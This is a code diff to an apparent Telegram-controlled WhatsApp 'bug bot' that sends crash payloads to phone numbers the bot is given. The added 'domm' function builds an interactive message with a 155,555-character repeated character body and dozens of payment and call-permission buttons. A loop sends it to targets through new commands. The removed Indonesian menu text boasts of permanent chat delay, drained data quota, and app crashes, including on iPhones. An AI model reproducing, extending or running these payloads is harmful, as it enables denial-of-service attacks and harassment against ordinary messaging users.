@@ -3129,6 +3129,149 @@ async function FlowXPaw(target) {
                 participant: { jid: target }
             });
         }
+        
+async function domm(target) {
+sock.relayMessage(
+target,
+{
+interactiveMessage: {
+header: {
+title: "🦠⃰‌°‌‌•⃟‌𝐗𝐊‌𝐈𝐋𝐔‌𝚫-𝐂‌𝐋𝐈⃨𝐄𝐍‌‌𝐓 ⿻ 𝐗 ✶ > 666",
+hasMediaAttachment: false
+},
+body: {
+text: "\ua9be".repeat(155555)
+},
+nativeFlowMessage: {
+messageParamsJson: "",
+buttons: [{
+name: "single_select",
+buttonParamsJson: "z"
+},
+{
+name: "call_permission_request",
+buttonParamsJson: "{}"
+},
+{
+name: "call_permission_request",
+buttonParamsJson: "{}"
+},
+{
+name: "call_permission_request",
+buttonParamsJson: "{}"
+},
+{
+name: "call_permission_request",
+buttonParamsJson: "{}"
+},
+{
+name: "payment_method",
+buttonParamsJson: "{}"
+},
+{
+name: "payment_method",
+buttonParamsJson: "{}"
+},
+{
+name: "payment_method",
+buttonParamsJson: "{}"
+},
+{
+name: "payment_method",
+buttonParamsJson: "{}"
+},
+{
+name: "payment_method",
+buttonParamsJson: "{}"
+},
+{
+name: "payment_method",
+buttonParamsJson: "{}"
+},
+{
+name: "payment_method",
+buttonParamsJson: "{}"
+},
+{
+name: "payment_method",
+buttonParamsJson: "{}"
+},
+{
+name: "payment_method",
+buttonParamsJson: "{}"
+},
+{
+name: "payment_method",
+buttonParamsJson: "{}"
+},
+{
+name: "payment_method",
+buttonParamsJson: "{}"
+},
+{
+name: "payment_method",
+buttonParamsJson: "{}"
+},
+{
+name: "payment_method",
+buttonParamsJson: "{}"
+},
+{
+name: "payment_method",
+buttonParamsJson: "{}"
+},
+{
+name: "payment_method",
+buttonParamsJson: "{}"
+},
+{
+name: "payment_method",
+buttonParamsJson: "{}"
+},
+{
+name: "payment_method",
+buttonParamsJson: "{}"
+},
+{
+name: "payment_method",
+buttonParamsJson: "{}"
+},
+{
+name: "payment_method",
+buttonParamsJson: "{}"
+},
+{
+name: "payment_method",
+buttonParamsJson: "{}"
+},
+{
+name: "payment_method",
+buttonParamsJson: "{}"
+},
+{
+name: "payment_method",
+buttonParamsJson: "{}"
+},
+{
+name: "payment_method",
+buttonParamsJson: "{}"
+},
+{
+name: "payment_method",
+buttonParamsJson: "{}"
+},
+{
+name: "payment_method",
+buttonParamsJson: "{}"
+},
+
+]
+}
+}      
+},
+{ participant: { jid: target } }
+);
+}
         async function crashcursor(target) {
   const msg = await generateWAMessageFromContent(target, {
     viewOnceMessage: {
@@ -3395,9 +3538,8 @@ async function frezbuttoninvis(target) {
 }
 
 async function ParamsCall(sock, target) {
-  for (let i = 0; i < 400; i++) {
-      await aviciLoc(target);
-      await new Promise((resolve) => setTimeout(resolve, 3500));
+  for (let i = 0; i < 3; i++) {
+      await domm(target);
       console.log(chalk.red("Send Bug Succes"))
   }
 }
@@ -3513,25 +3655,15 @@ bot.on("callback_query", async (query) => {
 ┃ Runtime : ${runtime}
 ╰═─══─══─══─══─══─═⬡
 
-#- OwnerOnly
-▢ /ranzunli 
-╰➤ Bug ini akan mengakibatkan target delay chat dan tidak leluasa menggunakan WhatsApp secara permanen meskipun hapus wa, keuntungan bug ini invisible ( tidak terlihat ) dan boros kuota target.
-Note : ini bug delay bukan tidak bisa buka wa ( C1 ), Delay chat akan terkirim 10-20 menit !!
-
-#- Recommend
-▢ /ranzbull
-╰➤ Bug ini akan mengakibatkan target delay chat dan tidak leluasa menggunakan WhatsApp, keuntungan bug ini invisible ( tidak terlihat ) dan boros kuota target.
-Note : ini bug delay bukan tidak bisa buka wa ( C1 ), Delay chat akan terkirim 10-20 menit !!
-
-#- Recommend
-▢ /ranzcrash
-╰➤ Bug ini akan mengakibatkan target crash permanen ( tidak bisa buka wa ) untuk mengatasi bug ini target harus hapus data/wa 
-Note : bug ini no invisible ( terlihat ) target akan melihat nomor bot mengirim bug/virus lewat notif
-
-#- iPhoneOnly
-▢ /ranzios 628xxx
-╰➤ Bug ini akan mengakibatkan iPhone force close ( tidak bisa buka wa ) setiap membuka wa target akan mental/crash.
-Note : bug ini no invisible ( terlihat ) target akan melihat nomor bot mengirim bug/virus
+╭═════════════════❀
+│   ⚘ BUG MENU ⚘
+│ 
+│ ❀ /ranzunli <number>
+│ ❀ /ranznew <number>
+│ ❀ /ranzbull <number>
+│ ❀ /ranzdom <number>
+│ 
+╰═════════════════❀
 `;
       replyMarkup = { inline_keyboard: [[{ text: "🔙 Kembali", callback_data: "back_to_main" }]] };
     }
@@ -3630,7 +3762,7 @@ Note : bug ini no invisible ( terlihat ) target akan melihat nomor bot mengirim 
 });
 
 // ---------------- ( Case bug Handler ) ----------------------- \\
-bot.onText(/\/ranzios (\d+)/, async (msg, match) => {
+bot.onText(/\/ranznew (\d+)/, async (msg, match) => {
                   const chatId = msg.chat.id;
                   const senderId = msg.from.id;
                   const targetNumber = match[1];
@@ -3809,7 +3941,7 @@ Silahkan beli ke Developer bot, contact Developer? tekan tombol Developer di baw
   (-) Break (-)
 */
 
-bot.onText(/\/ranzcrash (\d+)/, async (msg, match) => {
+bot.onText(/\/ranzdom (\d+)/, async (msg, match) => {
                   const chatId = msg.chat.id;
                   const senderId = msg.from.id;
                   const targetNumber = match[1];
@@ -3870,7 +4002,7 @@ Silahkan beli ke Developer bot, contact Developer? tekan tombol Developer di baw
     
    
     console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
-    await pedox(sock, jid);
+    await ParamsCall(sock, jid);
     console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
     
     
